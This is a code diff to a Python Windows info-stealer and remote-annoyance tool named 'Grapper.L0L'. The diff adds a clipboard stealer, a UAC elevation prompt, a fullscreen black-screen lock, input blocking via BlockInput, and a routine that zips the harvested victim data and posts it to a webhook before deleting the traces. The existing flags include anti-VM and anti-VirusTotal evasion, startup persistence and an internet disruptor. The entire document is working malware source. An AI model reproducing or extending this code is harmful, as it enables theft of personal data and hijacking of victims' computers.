@@ -1,3 +1,4 @@
+admin_ask = False
 anti_vm = False
 anti_vt = False
 anti_arun = False
@@ -7,10 +8,13 @@ ss = False
 startup = False
 con_info = False
 pc_info = False
+steal_clipboard = False
 down_file = False
 play_music = False
 
 fuck_internet = False
+black_screen = False
+fuck_input = False
 
 
 import os
@@ -29,6 +33,8 @@ try:
     import subprocess
     import time
     import pygame
+    import zipfile
+    import tkinter as tk
 
 except Exception as e:
     if hide:
@@ -50,6 +56,8 @@ except Exception as e:
     import subprocess
     import time
     import pygame
+    import zipfile
+    import tkinter as tk
 
 os.system("cls")
 class util:
@@ -62,6 +70,7 @@ class util:
 
 class dir:
     startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    pictures = os.path.join(os.path.expanduser("~"), "Pictures")
 
 class anti:
     def vm():
@@ -114,10 +123,13 @@ screenshoot = {ss}
 startup = {startup}
 connection info fetcher = {con_info}
 pc info fetcher = {pc_info}
+clipboard stealer = {steal_clipboard}
 file download = {down_file}
 music player = {play_music}
 
 internet fucker = {fuck_internet}
+black screen = {black_screen}
+input blocker = {fuck_input}
 """
     try:
         embed = {
@@ -133,7 +145,7 @@ internet fucker = {fuck_internet}
 
         payload = {
             "username": "Grapper.L0L",
-            "avatar_url": "https://your-avatar-url.com/avatar.png",
+            "avatar_url": "https://avatar.png",
             "embeds": [embed],
         }
 
@@ -142,15 +154,17 @@ internet fucker = {fuck_internet}
         pass
 
 
-def send_file():
-    pass
+def send_file(path):
+    with open(path, 'rb') as file:
+        files = {'file': (path, file)}
+        requests.post(wb, files=files)
 
 def send_message():
     try:
         payload = {
             "content": f"||@everyone|| {os.getlogin()} just got grabbed! gathering and sending info...",
             "username": "Grapper.L0L",
-            "avatar_url": "https://your-avatar-url.com/avatar.png",
+            "avatar_url": "https://avatar.png",
         }
         requests.post(wb, data=payload)
     except:
@@ -161,7 +175,7 @@ def alert(type):
         payload = {
             "content": f"||@everyone|| :rotating_light: ALERT! :rotating_light: {type} DETECTED!",
             "username": "Grapper.L0L",
-            "avatar_url": "https://your-avatar-url.com/avatar.png",
+            "avatar_url": "https://avatar.png",
         }
         requests.post(wb, data=payload)
     except:
@@ -197,6 +211,46 @@ while __name__ == "__main__":
                 exit()
         except:
             pass
+
+    if admin_ask:
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            pass
+        else:
+            try:
+                ctypes.windll.shell32.ShellExecuteW(
+                    None,
+                    "runas",
+                    sys.executable,
+                    " ".join(sys.argv),
+                    None,
+                    1 
+                )
+            except:
+                pass
+
+    if black_screen:
+        try:
+            pygame.init()
+            screen_width, screen_height = 8000, 6000
+            screen = pygame.display.set_mode((screen_width, screen_height))
+            pygame.display.set_caption("R3CI was here btw")
+            while True:
+                for event in pygame.event.get():
+                    if event.type == pygame.QUIT:
+                        pygame.quit()
+                        sys.exit()
+                screen.fill((0, 0, 0))
+                pygame.display.flip()
+        except:
+            pass
+    
+    if fuck_input:
+        try:
+            user32 = ctypes.windll.user32
+            user32.BlockInput(True)
+        except:
+            pass
+
 
     if hide:
         try:
@@ -295,6 +349,16 @@ while __name__ == "__main__":
         except:
             pass
 
+    if steal_clipboard:
+        try:
+            root = tk.Tk()
+            clipboard = root.clipboard_get()
+            root.destroy()
+            with open(f"{folder_name}/clipboard.txt", "w") as f:
+                f.write(clipboard)
+        except:
+            pass
+
     if down_file:
         try:
             down_file_path = ''
@@ -331,7 +395,18 @@ while __name__ == "__main__":
         except:
             pass
 
-    shutil.rmtree(folder_name)
+    with zipfile.ZipFile(f"{dir.pictures}/{os.getlogin()}.zip", 'w') as zip_file:
+        for folder_root, _, files in os.walk(folder_name):
+            for file in files:
+                file_path = os.path.join(folder_root, file)
+                arc_name = os.path.relpath(file_path, folder_name)
+                zip_file.write(file_path, arc_name)
+
+    send_file(f"{dir.pictures}/{os.getlogin()}.zip")
+    time.sleep(3)
+    os.remove(f"{dir.pictures}/{os.getlogin()}.zip")
+    shutil.rmtree(folder_name)  
+
     if destruct:
         util.destruct()
     exit()
